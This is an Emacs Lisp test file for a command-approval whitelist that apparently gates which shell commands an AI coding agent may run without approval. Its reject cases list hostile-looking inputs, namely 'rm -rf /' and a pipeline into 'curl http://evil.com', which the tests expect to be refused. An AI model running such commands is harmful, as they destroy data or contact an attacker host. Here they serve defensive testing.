;;; test-agent-shell-cursor-acp.el --- Tests for command approval -*- lexical-binding: t; -*-

;;; Commentary:
;;
;; ERT tests for the whitelisted-command approval stack.
;;
;; Interactive:
;;   M-x load-file RET global-settings/test-agent-shell-cursor-acp.el RET
;;   M-x ert RET t RET
;;
;; Batch:
;;   emacs --batch -l ert \
;;         -l global-settings/agent-shell-cursor-acp.el \
;;         -l global-settings/test-agent-shell-cursor-acp.el \
;;         -f ert-run-tests-batch-and-exit

;;; Code:

(require 'ert)
(require 'seq)
(require 'map)

(add-to-list 'load-path (file-name-directory (or load-file-name
                                                  buffer-file-name)))
(require 'agent-shell-cursor-acp)

;; ---------------------------------------------------------------------------
;;; strip-redirections
;; ---------------------------------------------------------------------------

(ert-deftest acp-strip-redirections ()
  (let ((strip #'agent-shell-cursor-acp--strip-redirections))
    (should (equal (string-trim (funcall strip "cmd 2>&1"))       "cmd"))
    (should (equal (string-trim (funcall strip "cmd >/dev/null")) "cmd"))
    (should (equal (string-trim (funcall strip "cmd 2>/dev/null")) "cmd"))
    (should (equal (string-trim (funcall strip "cmd &>/dev/null")) "cmd"))
    (should (equal (string-trim (funcall strip "cmd >>/tmp/log"))  "cmd"))
    (should (equal (funcall strip "cmd --flag arg") "cmd --flag arg"))
    (should (equal (string-trim (funcall strip "ninja -C build/ 2>&1 | tail -5"))
                   "ninja -C build/  | tail -5"))))

;; ---------------------------------------------------------------------------
;;; strip-timeout
;; ---------------------------------------------------------------------------

(ert-deftest acp-strip-timeout ()
  (let ((strip #'agent-shell-cursor-acp--strip-timeout))
    (should (equal (funcall strip "timeout 120 ninja -j4") "ninja -j4"))
    (should (equal (funcall strip "timeout 5 cmd")         "cmd"))
    (should (equal (funcall strip "ninja -j4")             "ninja -j4"))
    ;; Missing numeric argument — not stripped.
    (should (equal (funcall strip "timeout cmd")           "timeout cmd"))))

;; ---------------------------------------------------------------------------
;;; whitelisted-entry-p
;; ---------------------------------------------------------------------------

(ert-deftest acp-whitelisted-entry/accept ()
  (let ((ok #'agent-shell-cursor-acp--whitelisted-entry-p))
    (should (funcall ok "cd"))
    (should (funcall ok "cd /home/user/project"))
    (should (funcall ok "wc -l file.txt"))
    (should (funcall ok "ninja -C build/"))
    (should (funcall ok "mypy ."))
    (should (funcall ok "git show HEAD"))))

(ert-deftest acp-whitelisted-entry/reject ()
  (let ((ok #'agent-shell-cursor-acp--whitelisted-entry-p))
    (should-not (funcall ok "rm -rf /"))
    ;; "git push" is not whitelisted even though "git show" and "git log" are.
    (should-not (funcall ok "git push origin"))))

;; ---------------------------------------------------------------------------
;;; whitelisted-command-p  (integration)
;; ---------------------------------------------------------------------------

(ert-deftest acp-whitelisted-cmd/edge-cases ()
  (should-not (agent-shell-cursor-acp--whitelisted-command-p nil))
  (should-not (agent-shell-cursor-acp--whitelisted-command-p ""))
  (should-not (agent-shell-cursor-acp--whitelisted-command-p "``")))

(ert-deftest acp-whitelisted-cmd/examples ()
  "The three motivating examples from the task description."
  (let ((ok #'agent-shell-cursor-acp--whitelisted-command-p))
    (should (funcall ok "timeout 120 pytest -s -v tests/python/test_array/test_split_iterator.py"))
    (should (funcall ok "cd /home/jiamingy/ws/rakis_dev/rakis && mypy ."))
    (should (funcall ok "ninja -C ~/ws/rakis_dev/build/ install 2>&1 | tail -5"))))

(ert-deftest acp-whitelisted-cmd/accept ()
  (let ((ok #'agent-shell-cursor-acp--whitelisted-command-p))
    (should (funcall ok "ninja -j4"))
    (should (funcall ok "cd /some/path"))
    (should (funcall ok "timeout 10 cd /some/path"))
    (should (funcall ok "git log --oneline -10"))
    (should (funcall ok "ninja -C build/ >/tmp/out 2>/tmp/err"))
    ;; Compound commands with various separators.
    (should (funcall ok "cd /tmp ; ninja -j4"))
    (should (funcall ok "ninja -j4 || tail -1 /tmp/log"))))

(ert-deftest acp-whitelisted-cmd/backtick-wrapped ()
  (let ((ok #'agent-shell-cursor-acp--whitelisted-command-p))
    (should (funcall ok "`ninja -j4`"))
    (should (funcall ok "`cd /tmp && ninja -j4`"))
    (should-not (funcall ok "`curl http://example.com`"))))

(ert-deftest acp-whitelisted-cmd/reject ()
  (let ((ok #'agent-shell-cursor-acp--whitelisted-command-p))
    (should-not (funcall ok "curl http://example.com"))
    ;; One bad segment poisons the whole pipeline.
    (should-not (funcall ok "ninja -j4 | curl http://evil.com"))))

(provide 'test-agent-shell-cursor-acp)

;;; test-agent-shell-cursor-acp.el ends here
